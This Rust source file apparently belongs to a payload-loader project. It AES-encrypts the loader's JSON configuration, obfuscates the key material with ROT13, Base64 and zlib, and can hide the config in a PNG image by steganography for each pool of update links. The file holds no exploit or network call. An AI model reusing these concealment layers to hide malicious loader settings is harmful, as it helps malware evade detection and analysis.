use crate::config::Config;
use crate::dataoperation::DataOperation;
use crate::link::LinkFetch;

use std::fs;

use crate::dataoperation::apply_all_dataoperations;
use crate::dataoperation::AesMaterial;

use log::info;
use log::debug;
use std::env;

pub fn encrypt_config(config: Config, json_config_file: String){
    let message = "Unable to write file";
    let decrypt_file= format!("{}.encrypted",json_config_file);

    let mut dataoperations: Vec<DataOperation> = vec![];
    let aes_mat: AesMaterial = AesMaterial::generate_aes_material();
    dataoperations.push(DataOperation::AES(aes_mat));

    let mut data: Vec<u8> = config.concat_loader_jsondata().into_bytes();
    data = apply_all_dataoperations(&mut dataoperations, data).unwrap();

    let path_aes_conf = format!("{decrypt_file}.aes");
    info!("[+] AES encrypted loader config: {}", path_aes_conf);
    fs::write(&path_aes_conf, &data).expect(message);

    let path_aes_material = format!("{decrypt_file}.aes.dataop");
    info!("[+] AES decryption key material: {}", path_aes_material);
    fs::write(
        &path_aes_material,
        serde_json::to_string(&dataoperations).unwrap(),
    ).expect(message);

    // Ofuscate AES material with ROT13+BASE64
    let mut dataoperations: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64,DataOperation::ZLIB];
    
    let mut data: Vec<u8> = fs::read(format!("{decrypt_file}.aes.dataop")).unwrap();
    data = apply_all_dataoperations(&mut dataoperations, data).unwrap();
    let path_aes_material_obfuscated = format!("{decrypt_file}.aes.dataop.obfuscated");
    info!(
        "[+] AES decryption key obfuscated with {:?}: {}",dataoperations,
        path_aes_material_obfuscated
    );
    fs::write(&path_aes_material_obfuscated, &data).expect(message);  

    //NEW!  

    let path_aes_material_obfuscated_dataop = format!("{decrypt_file}.aes.dataop.obfuscated.dataop");
    dataoperations.reverse();
    let mut obfuscated_dataop_zlib=serde_json::to_vec(&dataoperations).unwrap();
    let mut zlib_dataop: Vec<DataOperation> = vec![DataOperation::ZLIB];
    obfuscated_dataop_zlib = apply_all_dataoperations(&mut zlib_dataop, obfuscated_dataop_zlib).unwrap();
    fs::write(
        &path_aes_material_obfuscated_dataop,
        obfuscated_dataop_zlib,
    ).expect(message);
    info!(        "[+] AES decryption key de-obfuscation steps: {}", path_aes_material_obfuscated_dataop    );
}



use std::path::Path;
pub fn initialize_all_configs(config: Config, json_config_file: String) {
    // set input image for image...
    // TODO give a list of image to this function
    let input_image = concat!(env!("HOME"), "/.malleable/config/troll.png");
    let input_image_name = Path::new(input_image).file_name().unwrap().to_str().unwrap().to_lowercase();
    match env::var("STEGANO_INPUT_IMAGE") {
        Ok(_) => (),
        Err(_) => unsafe {
            env::set_var(
                "STEGANO_INPUT_IMAGE",
                input_image,
            );
        },
    }

    encrypt_config(config.clone(),json_config_file.clone());
    
    let mut dataope_list: Vec<Vec<DataOperation>> = vec![];
    for (_pool_nb, (_pool_name, pool)) in config.update_links.clone() {
        for update_link in pool.pool_links {
            let dataope =update_link.get_dataoperation();
            if dataope_list.contains(&dataope) == false {
                dataope_list.push(dataope);
            }
        }
    }
    //TODO encrypt config

    
    debug!("Data operation list for Config: {:?}",dataope_list);
    for mut dataop in dataope_list{
        let mut extension_file_name="".to_string();
        let mut output_filename_steg: String = "".to_string();
        let mut last_dataop_is_steg: bool=false;
        for onedataop in &dataop{
            let extension: String = format!(".{:?}",onedataop).to_lowercase();
            extension_file_name.push_str(&extension);
            if onedataop == &DataOperation::STEGANO{
                output_filename_steg = format!("{}{}-{}.png",json_config_file, extension_file_name,input_image_name);
                last_dataop_is_steg = true;
                unsafe {
                    env::set_var(
                        "STEGANO_OUTPUT_IMAGE",
                        output_filename_steg.clone(),
                    );
                }
            };
        }

        let mut data: Vec<u8> = config.clone().concat_loader_jsondata().into_bytes();
        data = apply_all_dataoperations(&mut dataop, data).unwrap();

        let output_filename: String;
        if last_dataop_is_steg == false {
            output_filename = format!("{}{}",json_config_file, extension_file_name);
            fs::write(&output_filename, &data).expect("Unable to write file");
        } else{
            output_filename = output_filename_steg;
        }
        info!("Write CONFIG: {}",output_filename);
   
    };

}


